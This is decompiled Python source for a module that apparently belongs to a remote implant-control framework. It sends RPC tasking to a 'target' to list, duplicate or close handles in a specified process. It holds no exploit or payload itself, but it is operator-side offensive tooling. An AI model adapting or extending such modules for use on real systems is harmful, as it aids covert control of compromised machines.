# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Handles_Tasking.py
_ACTION_LIST = 0
_ACTION_DUPLICATE = 1
_ACTION_CLOSE = 2

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    from os import getpid
    import mcl.status
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.handles', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.handles.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['action'] == _ACTION_LIST:
        tgtParams = mca.status.cmd.handles.ParamsQuery()
        tgtParams.processId = lpParams['procid']
        tgtParams.all = lpParams['all']
        tgtParams.memory = lpParams['memory']
        rpc = mca.status.cmd.handles.tasking.RPC_INFO_QUERY
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    elif lpParams['action'] == _ACTION_DUPLICATE:
        tgtParams = mca.status.cmd.handles.ParamsDuplicate()
        tgtParams.processId = lpParams['procid']
        tgtParams.handleValue = lpParams['handleValue']
        rpc = mca.status.cmd.handles.tasking.RPC_INFO_DUPLICATE
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    elif lpParams['action'] == _ACTION_CLOSE:
        tgtParams = mca.status.cmd.handles.ParamsClose()
        tgtParams.processId = lpParams['procid']
        tgtParams.handleValue = lpParams['handleValue']
        rpc = mca.status.cmd.handles.tasking.RPC_INFO_CLOSE
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    else:
        mcl.tasking.OutputError('Unhandled action type')
        return False
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.status.cmd.handles.errorStrings)
        return False
    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)